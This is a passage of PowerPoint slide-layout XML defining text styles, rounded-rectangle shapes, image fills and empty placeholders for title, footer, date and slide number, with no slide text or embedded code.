                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1235">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="bk object 17"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="415636" y="3443008"/>
            <a:ext cx="5913198" cy="310963"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1235">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="bk object 18"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="463743" y="3461218"/>
            <a:ext cx="5816984" cy="239525"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 6204584"/>
              <a:gd name="T1" fmla="*/ 770 h 342264"/>
              <a:gd name="T2" fmla="*/ 0 w 6204584"/>
              <a:gd name="T3" fmla="*/ 271 h 342264"/>
              <a:gd name="T4" fmla="*/ 12 w 6204584"/>
              <a:gd name="T5" fmla="*/ 166 h 342264"/>
              <a:gd name="T6" fmla="*/ 42 w 6204584"/>
              <a:gd name="T7" fmla="*/ 79 h 342264"/>
              <a:gd name="T8" fmla="*/ 88 w 6204584"/>
              <a:gd name="T9" fmla="*/ 21 h 342264"/>
              <a:gd name="T10" fmla="*/ 145 w 6204584"/>
              <a:gd name="T11" fmla="*/ 0 h 342264"/>
              <a:gd name="T12" fmla="*/ 9940 w 6204584"/>
              <a:gd name="T13" fmla="*/ 0 h 342264"/>
              <a:gd name="T14" fmla="*/ 9997 w 6204584"/>
              <a:gd name="T15" fmla="*/ 21 h 342264"/>
              <a:gd name="T16" fmla="*/ 10042 w 6204584"/>
              <a:gd name="T17" fmla="*/ 79 h 342264"/>
              <a:gd name="T18" fmla="*/ 10074 w 6204584"/>
              <a:gd name="T19" fmla="*/ 166 h 342264"/>
              <a:gd name="T20" fmla="*/ 10085 w 6204584"/>
              <a:gd name="T21" fmla="*/ 271 h 342264"/>
              <a:gd name="T22" fmla="*/ 10085 w 6204584"/>
              <a:gd name="T23" fmla="*/ 770 h 342264"/>
              <a:gd name="T24" fmla="*/ 10074 w 6204584"/>
              <a:gd name="T25" fmla="*/ 875 h 342264"/>
              <a:gd name="T26" fmla="*/ 10042 w 6204584"/>
              <a:gd name="T27" fmla="*/ 961 h 342264"/>
              <a:gd name="T28" fmla="*/ 9997 w 6204584"/>
              <a:gd name="T29" fmla="*/ 1020 h 342264"/>
              <a:gd name="T30" fmla="*/ 9940 w 6204584"/>
              <a:gd name="T31" fmla="*/ 1041 h 342264"/>
              <a:gd name="T32" fmla="*/ 145 w 6204584"/>
              <a:gd name="T33" fmla="*/ 1041 h 342264"/>
              <a:gd name="T34" fmla="*/ 88 w 6204584"/>
              <a:gd name="T35" fmla="*/ 1020 h 342264"/>
              <a:gd name="T36" fmla="*/ 42 w 6204584"/>
              <a:gd name="T37" fmla="*/ 961 h 342264"/>
              <a:gd name="T38" fmla="*/ 12 w 6204584"/>
              <a:gd name="T39" fmla="*/ 875 h 342264"/>
              <a:gd name="T40" fmla="*/ 0 w 6204584"/>
              <a:gd name="T41" fmla="*/ 770 h 34226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6204584" h="342264">
                <a:moveTo>
                  <a:pt x="0" y="252710"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="89156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7006" y="54452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26113" y="26113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54452" y="7006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89156" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6115177" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6149881" y="7006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6178224" y="26113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6197335" y="54452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6204343" y="89156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6204343" y="252710"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6197335" y="287414"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6178224" y="315753"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6149881" y="334861"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6115177" y="341867"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89156" y="341867"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54452" y="334861"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26113" y="315753"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7006" y="287414"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="252710"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="C82506"/>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="bk object 19"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="432956" y="2333626"/>
            <a:ext cx="2690091" cy="310963"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1235">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="bk object 20"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="481061" y="2350434"/>
            <a:ext cx="2593879" cy="240926"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2767329"/>
              <a:gd name="T1" fmla="*/ 890 h 342264"/>
              <a:gd name="T2" fmla="*/ 0 w 2767329"/>
              <a:gd name="T3" fmla="*/ 314 h 342264"/>
              <a:gd name="T4" fmla="*/ 12 w 2767329"/>
              <a:gd name="T5" fmla="*/ 192 h 342264"/>
              <a:gd name="T6" fmla="*/ 42 w 2767329"/>
              <a:gd name="T7" fmla="*/ 92 h 342264"/>
              <a:gd name="T8" fmla="*/ 88 w 2767329"/>
              <a:gd name="T9" fmla="*/ 25 h 342264"/>
              <a:gd name="T10" fmla="*/ 144 w 2767329"/>
              <a:gd name="T11" fmla="*/ 0 h 342264"/>
              <a:gd name="T12" fmla="*/ 4329 w 2767329"/>
              <a:gd name="T13" fmla="*/ 0 h 342264"/>
              <a:gd name="T14" fmla="*/ 4385 w 2767329"/>
              <a:gd name="T15" fmla="*/ 25 h 342264"/>
              <a:gd name="T16" fmla="*/ 4430 w 2767329"/>
              <a:gd name="T17" fmla="*/ 92 h 342264"/>
              <a:gd name="T18" fmla="*/ 4462 w 2767329"/>
              <a:gd name="T19" fmla="*/ 192 h 342264"/>
              <a:gd name="T20" fmla="*/ 4473 w 2767329"/>
              <a:gd name="T21" fmla="*/ 314 h 342264"/>
              <a:gd name="T22" fmla="*/ 4473 w 2767329"/>
              <a:gd name="T23" fmla="*/ 890 h 342264"/>
              <a:gd name="T24" fmla="*/ 4462 w 2767329"/>
              <a:gd name="T25" fmla="*/ 1012 h 342264"/>
              <a:gd name="T26" fmla="*/ 4430 w 2767329"/>
              <a:gd name="T27" fmla="*/ 1113 h 342264"/>
              <a:gd name="T28" fmla="*/ 4385 w 2767329"/>
              <a:gd name="T29" fmla="*/ 1180 h 342264"/>
              <a:gd name="T30" fmla="*/ 4329 w 2767329"/>
              <a:gd name="T31" fmla="*/ 1205 h 342264"/>
              <a:gd name="T32" fmla="*/ 144 w 2767329"/>
              <a:gd name="T33" fmla="*/ 1205 h 342264"/>
              <a:gd name="T34" fmla="*/ 88 w 2767329"/>
              <a:gd name="T35" fmla="*/ 1180 h 342264"/>
              <a:gd name="T36" fmla="*/ 42 w 2767329"/>
              <a:gd name="T37" fmla="*/ 1113 h 342264"/>
              <a:gd name="T38" fmla="*/ 12 w 2767329"/>
              <a:gd name="T39" fmla="*/ 1012 h 342264"/>
              <a:gd name="T40" fmla="*/ 0 w 2767329"/>
              <a:gd name="T41" fmla="*/ 890 h 34226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767329" h="342264">
                <a:moveTo>
                  <a:pt x="0" y="252710"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="89156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7006" y="54452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26113" y="26113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54452" y="7006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89156" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2677731" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2712434" y="7006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2740772" y="26113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2759879" y="54452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2766885" y="89156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2766885" y="252710"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2759879" y="287414"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2740772" y="315753"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2712434" y="334861"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2677731" y="341867"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89156" y="341867"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54452" y="334861"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26113" y="315753"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7006" y="287414"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="252710"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25399">
            <a:solidFill>
              <a:srgbClr val="C82506"/>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Holder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4500563" y="44649"/>
            <a:ext cx="3190875" cy="389530"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2471" b="0" i="0" u="heavy">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="3840480"/>
            <a:ext cx="8534400" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{119C6113-EC01-47C8-93FD-B2CCD30192E6}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr defTabSz="805466" eaLnBrk="0" hangingPunct="0">
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{DD326905-C594-4149-93BF-51DB69620CBB}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="277727077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940594" y="357188"/>
            <a:ext cx="10310812" cy="865622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="5559" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="903090" y="1193008"/>
            <a:ext cx="10385822" cy="389530"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2471" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{66EFFD6C-7133-4CD4-BD61-1BE3EAFB05F5}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
